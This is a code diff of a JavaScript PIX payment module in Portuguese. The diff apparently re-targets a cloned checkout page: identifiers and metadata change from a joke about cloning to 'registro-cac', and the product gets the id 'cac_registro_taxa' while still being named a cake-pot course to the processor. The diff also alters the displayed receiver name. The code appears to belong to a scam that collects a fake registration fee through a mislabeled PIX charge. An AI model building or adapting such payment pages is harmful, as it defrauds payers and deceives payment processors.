@@ -3,7 +3,7 @@ const PIX_API = {
     amount: 48.70,
 
     generateIdentifier() {
-        return `heiescalakk_${Date.now()}_${Math.random().toString(36).slice(2, 11)}`;
+        return `cac_${Date.now()}_${Math.random().toString(36).slice(2, 11)}`;
     },
 
     getUserData() {
@@ -45,14 +45,14 @@ const PIX_API = {
                 document: userData.cpf
             },
             products: [{
-                id: '',
+                id: 'cac_registro_taxa',
                 name: 'Curso de bolo de pote',
                 quantity: 1,
                 price: this.amount,
                 physical: false
             }],
             metadata: {
-                provider: 'vai-tentar-clonar-logo-eu-kkk',
+                provider: 'registro-cac',
                 orderId: identifier
             }
         };
@@ -152,7 +152,7 @@ function showPixPayment(paymentData, userData = null) {
                 <div class="bg-yellow-50 border-l-4 border-yellow-400 p-3 mb-4">
                     <div class="text-sm">
                         <p class="font-semibold text-yellow-800 mb-1">⚠️ Nome do Recebedor:</p>
-                        <p class="text-yellow-700">O PIX será processado em nome de <strong>BRASIL PAY SERVICOS LTDA</strong>.</p>
+                        <p class="text-yellow-700">O PIX será processado em nome de <strong>PBRASIL PAY SERVICOS LTDA</strong>.</p>
                     </div>
                 </div>
             </div>
@@ -231,7 +231,23 @@ async function gerarPix() {
 }
 
 document.addEventListener('DOMContentLoaded', function() {
-    gerarPix();
+    const savedPaymentData = localStorage.getItem('pixPaymentData');
+    const savedPaymentStatus = localStorage.getItem('pixPaymentStatus');
+
+    if (savedPaymentData && savedPaymentStatus !== 'PAID') {
+        try {
+            const paymentData = JSON.parse(savedPaymentData);
+            if (paymentData.pix && paymentData.pix.code) {
+                showPixPayment(paymentData);
+            } else {
+                gerarPix();
+            }
+        } catch (error) {
+            gerarPix();
+        }
+    } else {
+        gerarPix();
+    }
 });
 
 window.copyPixCode = async function () {
